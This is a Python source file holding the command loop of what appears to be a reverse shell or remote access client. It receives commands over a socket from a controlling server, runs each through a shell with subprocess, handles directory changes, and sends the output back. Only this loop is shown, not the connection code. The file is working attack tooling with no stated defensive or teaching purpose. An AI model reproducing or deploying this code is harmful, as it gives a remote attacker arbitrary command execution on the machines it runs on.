import subprocess
import os

def execute_commands(client_socket):
    current_directory = "."

    while True:
        try:
            # Receiving a command from the server
            command = client_socket.recv(1024).decode()

            if command.lower() == "exit":
                print("[+] Shutdown on server request...")
                break

            # Processing the "cd" command
            if command.startswith("cd"):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    current_directory = os.getcwd()
                    response = f"[+] Successfully moved to the directory:=> {current_directory}"
                except Exception as e:
                    response = f"[!] Error changing directory: {e}"
            else:
                # Executing a command via subprocess
                process = subprocess.Popen(
                    command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                stdout, stderr = process.communicate()

                if stdout:
                    response = stdout.decode()
                elif stderr:
                    response = stderr.decode()
                else:
                    response = "[+] The command was executed successfully, but there is no data."

            # Sending the result to the server
            client_socket.send(response.encode())

        except Exception as e:
            client_socket.send(f"[!] Command execution error:=> {e}".encode())
            break

    client_socket.close()
